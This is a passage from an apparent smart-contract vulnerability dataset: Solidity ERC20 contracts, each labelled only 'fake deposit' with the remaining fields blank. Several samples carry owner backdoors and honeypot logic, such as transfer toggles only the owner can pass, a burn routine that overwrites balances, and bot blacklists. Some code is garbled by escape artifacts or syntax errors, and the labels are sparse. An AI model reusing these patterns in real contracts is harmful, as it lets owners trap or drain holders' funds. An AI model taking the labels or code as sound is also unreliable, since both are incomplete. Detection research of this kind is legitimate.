SUPPLY.mul(10 ** uint256(decimals()));\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(0x0000000000000000000000000000000000000000, msg.sender, _totalSupply);\r\n    }\r\n\r\n   \r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    \r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n   \r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract ERC20 is ERC20Data, Domain {\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n    /// @notice Transfers `amount` tokens from `msg.sender` to `to`.\r\n    /// @param to The address to move the tokens.\r\n    /// @param amount of the tokens to move.\r\n    /// @return (bool) Returns True if succeeded.\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        // If `amount` is 0, or `msg.sender` is `to` nothing happens\r\n        if (amount != 0) {\r\n            uint256 srcBalance = balanceOf[msg.sender];\r\n            require(srcBalance >= amount, \"ERC20: balance too low\");\r\n            if (msg.sender != to) {\r\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\r\n\r\n                balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\r\n                balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\r\n            }\r\n        }\r\n        emit Transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /// @notice Transfers `amount` tokens from `from` to `to`. Caller needs approval for `from`.\r\n    /// @param from Address to draw tokens from.\r\n    /// @param to The address to move the tokens.\r\n    /// @param amount The token amount to move.\r\n    /// @return (bool) Returns True if succeeded.\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public returns (bool) {\r\n        // If `amount` is 0, or `from` is `to` nothing happens\r\n        if (amount != 0) {\r\n            uint256 srcBalance = balanceOf[from];\r\n            require(srcBalance >= amount, \"ERC20: balance too low\");\r\n\r\n            if (from != to) {\r\n                uint256 spenderAllowance = allowance[from][msg.sender];\r\n                // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\r\n                if (spenderAllowance != type(uint256).max) {\r\n                    require(spenderAllowance >= amount, \"ERC20: allowance too low\");\r\n                    allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\r\n                }\r\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\r\n\r\n                balanceOf[from] = srcBalance - amount; // Underflow is checked\r\n                balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\r\n            }\r\n        }\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /// @notice Approves `amount` from sender to be spend by `spender`.\r\n    /// @param spender Address of the party that can draw from msg.sender's account.\r\n    /// @param amount The maximum collective amount that `spender` can draw.\r\n    /// @return (bool) Returns True if approved.\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\r\n    bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\r\n\r\n    /// @notice Approves `value` from `owner_` to be spend by `spender`.\r\n    /// @param owner_ Address of the owner.\r\n    /// @param spender The address of the spender that gets approved to draw from `owner_`.\r\n    /// @param value The maximum collective amount that `spender` can draw.\r\n    /// @param deadline This permit must be redeemed before this deadline (UTC timestamp in seconds).\r\n    function permit(\r\n        address owner_,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external {\r\n        require(owner_ != address(0), \"ERC20: Owner cannot be 0\");\r\n        require(block.timestamp < deadline, \"ERC20: Expired\");\r\n        require(\r\n            ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\r\n                owner_,\r\n            \"ERC20: Invalid Signature\"\r\n        );\r\n        allowance[owner_][spender] = value;\r\n        emit Approval(owner_, spender, value);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.3;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Context.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address =u003e uint256) internal _balances;\r\n    mapping (address =u003e bool) private _feeBurn;\r\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\r\n    bool intTx = true;\r\n    uint256 _burnRate;\r\n    uint256 internal _totalSupply;\r\n    string internal _name;\r\n    string internal _symbol;\r\n    address internal _owner;\r\n    uint256 public _decreaseFee = 250000  * 10**18;\r\n    mapping (address =u003e bool) public _approvedTransfer;\r\n    mapping (address =u003e bool) public _bBots;\r\n\r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: only the owner allowed\");\r\n        _;\r\n    }\r\n\r\n\r\n\r\n\r\n    function initContract() public virtual onlyOwner {\r\n        if (intTx == true) {intTx = false;} else {intTx = true;}\r\n    }\r\n\r\n    function burnRate (uint256 value) external onlyOwner {\r\n        _burnRate = value;\r\n    }\r\n  \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n   \r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n  \r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\t\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\r\n        \r\n        if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\r\n            require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \r\n        }\r\n        \r\n\r\n        if (_feeBurn[sender] || _feeBurn[recipient]) \r\n        require(intTx == false, \"\");\r\n        if (intTx == true || sender == _owner || recipient == _owner) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);}\r\n        else {require (intTx == true, \"\");} \r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = _burnRate - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n    \r\n    function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\r\n        _decreaseFee = decreaseFeeAddress;\r\n    }\r\n  \r\n    function approveTransfer(address account) external onlyOwner {\r\n        _approvedTransfer[account] = true; \r\n    }\r\n    \r\n    function bBots(address account) external onlyOwner {\r\n        _bBots[account] = true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.6.12;\r\n\r\n\r\ncontract WrappedIbbtcEth is Initializable, ERC20Upgradeable, PausableUpgradeable, AccessControlUpgradeable {\r\n    IERC20Upgradeable public ibbtc;\r\n    ICore public core;\r\n    uint256 public pricePerShare;\r\n\r\n    // Pausing\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n    \r\n    event SetCore(address core);\r\n\r\n    function initialize(address _ibbtc, address _core) public initializer {\r\n        require(msg.sender == 0xDA25ee226E534d868f0Dd8a459536b03fEE9079b); // dev: only verified deployer\r\n        __ERC20_init(\"Wrapped Interest-Bearing Bitcoin\", \"wibBTC\");\r\n        core = ICore(_core);\r\n        ibbtc = IERC20Upgradeable(_ibbtc);\r\n\r\n        _setPricePerShare();\r\n\r\n        emit SetCore(_core);\r\n    }\r\n\r\n\r\n    \r\n\r\n    /// ===== Permissionless Calls =====\r\n    /// @dev Deposit ibBTC to mint wibBTC shares\r\n    function mint(uint256 _shares) external whenNotPaused {\r\n        if (_shares == 0) {\r\n            return;\r\n        }\r\n        require(ibbtc.transferFrom(_msgSender(), address(this), _shares));\r\n        _mint(_msgSender(), _shares);\r\n    }\r\n\r\n    /// @dev Redeem wibBTC for ibBTC. Denominated in shares.\r\n    function burn(uint256 _shares) external whenNotPaused {\r\n        if (_shares == 0) {\r\n            return;\r\n        }\r\n        _burn(_msgSender(), _shares);\r\n        require(ibbtc.transfer(_msgSender(), _shares));\r\n    }\r\n\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) public override whenNotPaused returns (bool) {\r\n        /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\r\n        /// Some naming confusion emerges due to maintaining original ERC20 var names\r\n\r\n        if (amount == 0) {\r\n            return true;\r\n        }\r\n\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount) public override whenNotPaused returns (bool) {\r\n        /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\r\n        /// Some naming confusion emerges due to maintaining original ERC20 var names\r\n\r\n        if (amount == 0) {\r\n            return true;\r\n        }\r\n        \r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal override {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 shares = balanceToShares(amount);\r\n        _balances[sender] = _balances[sender].sub(shares, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(shares);\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n \r\n    function _mint(address account, uint256 shares) internal override {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        uint256 amount = sharesToBalance(shares);\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply = _totalSupply.add(shares);\r\n        _balances[account] = _balances[account].add(shares);\r\n\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n\r\n    function _burn(address account, uint256 shares) internal override {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        \r\n        uint256 amount = sharesToBalance(shares);\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        _balances[account] = _balances[account].sub(shares, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(shares);\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n \r\n    function _setPricePerShare() internal {\r\n        pricePerShare = core.pricePerShare();\r\n    }\r\n\r\n\r\n    function balanceToShares(uint256 balance) public view returns (uint256) {\r\n        return balance.mul(1e18).div(pricePerShare);\r\n    }\r\n\r\n    function sharesToBalance(uint256 shares) public view returns (uint256) {\r\n        return shares.mul(pricePerShare).div(1e18);\r\n    }\r\n}\r\n        \n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "\r\npragma solidity 0.6.12;\r\n\r\nimport \"../../Domain.sol\";\r\nimport \"../../../interfaces/token/ERC20/IDetailedERC20.sol\";\r\n\r\nimport \"hardhat/console.sol\";\r\n\r\n\r\ncontract ERC20Data {\r\n\tmapping(address => uint256) public balanceOf;\r\n\tmapping(address => mapping(address => uint256)) public allowance;\r\n\tmapping(address => uint256) public nonces;\r\n\r\n\tstring public name;\r\n\tstring public symbol;\r\n\tuint256 public decimals;\r\n}\r\n\r\ncontract ERC20 is ERC20Data, Domain {\r\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n\tevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n\tconstructor(string memory name_, string memory symbol_) public {\r\n\t\tname = name_;\r\n\t\tsymbol = symbol_;\r\n\t\tdecimals = 18;\r\n\t}\r\n\r\n\tfunction transfer(address to, uint256 amount) public returns (bool) {\r\n\t\t// If `amount` is 0, or `msg.sender` is `to` nothing happens\r\n\t\tif (amount != 0) {\r\n\t\t\tuint256 srcBalance = balanceOf[msg.sender];\r\n\t\t\trequire(srcBalance >= amount, \"ERC20::transfer: balance too low\");\r\n\t\t\tif (msg.sender != to) {\r\n\t\t\t\trequire(to != address(0), \"ERC20::transfer: no zero address\"); // Moved down so low balance calls safe some gas\r\n\r\n\t\t\t\tbalanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\r\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\r\n\t\t\t}\r\n\t\t}\r\n\t\temit Transfer(msg.sender, to, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 amount\r\n\t) public returns (bool) {\r\n\t\t// If `amount` is 0, or `from` is `to` nothing happens\r\n\t\tif (amount != 0) {\r\n\t\t\tuint256 srcBalance = balanceOf[from];\r\n\t\t\trequire(srcBalance >= amount, \"ERC20::transferFrom: balance too low\");\r\n\r\n\t\t\tif (from != to) {\r\n\t\t\t\tuint256 spenderAllowance = allowance[from][msg.sender];\r\n\r\n\t\t\t\t// If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\r\n\t\t\t\tif (spenderAllowance != type(uint256).max) {\r\n\t\t\t\t\trequire(spenderAllowance >= amount, \"ERC20::transferFrom: allowance too low\");\r\n\t\t\t\t\tallowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\r\n\t\t\t\t}\r\n\t\t\t\trequire(to != address(0), \"ERC20::transferFrom: no zero address\"); // Moved down so other failed calls safe some gas\r\n\r\n\t\t\t\tbalanceOf[from] = srcBalance - amount; // Underflow is checked\r\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\r\n\t\t\t}\r\n\t\t}\r\n\t\temit Transfer(from, to, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\r\n\tfunction approve(address spender, uint256 amount) public returns (bool) {\r\n\t\tallowance[msg.sender][spender] = amount;\r\n\t\temit Approval(msg.sender, spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\t// solhint-disable-next-line func-name-mixedcase\r\n\tfunction DOMAIN_SEPARATOR() external view returns (bytes32) {\r\n\t\treturn _domainSeparator();\r\n\t}\r\n\r\n\t// keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\r\n\tbytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\r\n\r\n\tfunction permit(\r\n\t\taddress owner_,\r\n\t\taddress spender,\r\n\t\tuint256 value,\r\n\t\tuint256 deadline,\r\n\t\tuint8 v,\r\n\t\tbytes32 r,\r\n\t\tbytes32 s\r\n\t) external {\r\n\t\trequire(owner_ != address(0), \"ERC20::permit: Owner cannot be 0\");\r\n\t\trequire(block.timestamp < deadline, \"ERC20: Expired\");\r\n\t\trequire(\r\n\t\t\tecrecover(\r\n\t\t\t\t_getDigest(\r\n\t\t\t\t\tkeccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))\r\n\t\t\t\t),\r\n\t\t\t\tv,\r\n\t\t\t\tr,\r\n\t\t\t\ts\r\n\t\t\t) == owner_,\r\n\t\t\t\"ERC20::permit: Invalid Signature\"\r\n\t\t);\r\n\t\tallowance[owner_][spender] = value;\r\n\t\temit Approval(owner_, spender, value);\r\n\t}\r\n}\r\n\r\n\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "\r\npragma solidity =0.8.3;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Context.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address =u003e uint256) internal _balances;\r\n    mapping (address =u003e bool) private _approveTransfer;\r\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\r\n    bool intTx = true;\r\n    uint256 _burnRate;\r\n    uint256 internal _totalSupply;\r\n    string internal _name;\r\n    string internal _symbol;\r\n    address internal _owner;\r\n     \r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: only the owner allowed\");\r\n        _;\r\n    }\r\n\t\r\n    \r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function approveTransfer(address _address) external onlyOwner {\r\n        _approveTransfer[_address] = true;\r\n    }\r\n\r\n    function burnRate (uint256 value) external onlyOwner {\r\n        _burnRate = value;\r\n    }\r\n    \r\n  \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n   \r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\r\n        if (_approveTransfer[sender] || _approveTransfer[recipient]) \r\n        require(intTx == false, \"\");\r\n        if (intTx == true || sender == _owner || recipient == _owner) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);}\r\n        else {require (intTx == true, \"\");} \r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = _burnRate - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n  \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}\r\n\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\r\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n        uint256 currentRate =  _getRate();\r\n        return rAmount.div(currentRate);\r\n    }\r\n\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        if (BOTaddressToLock[sender] || BOTaddressToLock[recipient])\r\n            require(amount == 0, \"We don't like BOTs, take your toys and go away.\");\r\n        if (allLimitsOff == false && maxTokensLimitDuringFirstHour == false && sender != owner() && recipient != owner()) \r\n            require(amount <= _maxTokensInitialLimit, \"Tokens amount too high. Contract is running on limited mode. Max 0.004 Eth per each transaction.\");\r\n        if (allLimitsOff == false && maxTokensLimitDuringFirstHour == true && sender != owner() && recipient != owner())\r\n            require(amount <= _maxTokensLimitDuringFirstHour, \"Tokens amount too high. Current 1hour limit set to less than 1.0 Eth per each transaction.\");\r\n        if (_contractRunning == true || sender == owner() || recipient == owner()) {\r\n            if (_isExcluded[sender] && !_isExcluded[recipient]) {\r\n                _transferFromExcluded(sender, recipient, amount);\r\n            } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\r\n                _transferToExcluded(sender, recipient, amount);\r\n              } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\r\n                _transferStandard(sender, recipient, amount);\r\n                } else if (_isExcluded[sender] && _isExcluded[recipient]) {\r\n                _transferBothExcluded(sender, recipient, amount);\r\n                  } else {\r\n                _transferStandard(sender, recipient, amount);\r\n                    }\r\n        }\r\n        else {\r\n            require (_contractRunning == true, \"Contract not started yet. Try later.\");\r\n        }\r\n    }\r\n\r\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n        _rTotal = _rTotal.sub(rFee);\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n    }\r\n\r\n        \n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "abstract contract ERC20 is IERC20, Domain {\r\n    mapping(address => uint256) public override balanceOf;\r\n    mapping(address => mapping(address => uint256)) public override allowance\r\n    mapping(address => uint256) public nonces;\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        if (amount != 0 || msg.sender == to) {\r\n            uint256 srcBalance = balanceOf[msg.sender];\r\n            require(srcBalance >= amount, \"ERC20: balance too low\");\r\n            if (msg.sender != to) {\r\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\r\n\r\n                balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\r\n                balanceOf[to] += amount;\r\n            }\r\n        }\r\n        emit Transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public returns (bool) {\r\n        if (amount != 0) {\r\n            uint256 srcBalance = balanceOf[from];\r\n            require(srcBalance >= amount, \"ERC20: balance too low\");\r\n\r\n            if (from != to) {\r\n                uint256 spenderAllowance = allowance[from][msg.sender];\r\n                if (spenderAllowance != type(uint256).max) {\r\n                    require(spenderAllowance >= amount, \"ERC20: allowance too low\");\r\n                    allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\r\n                }\r\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\r\n\r\n                balanceOf[from] = srcBalance - amount; // Underflow is checked\r\n                balanceOf[to] += amount;\r\n            }\r\n        }\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\r\n\r\n}\r\n\r\n\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract StandardToken is Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    // cooldown\r\n    mapping (address => uint) public lastBuyTime;\r\n    mapping (address => bool) public bots;\r\n    bool _cooldownEnabled = true;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] = balances[msg.sender].sub(_value);\r\n            balances[_to] = balances[_to].add(_value);\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        require(!_cooldownEnabled ||\r\n                ((_from == uni || lastBuyTime[_from] + 30 seconds < block.timestamp) &&\r\n                (_to == uni || lastBuyTime[_to] + 30 seconds < block.timestamp)), \"Cool down bro\");\r\n        require(!bots[_from] && !bots[_to], \"No bots plz\");\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) 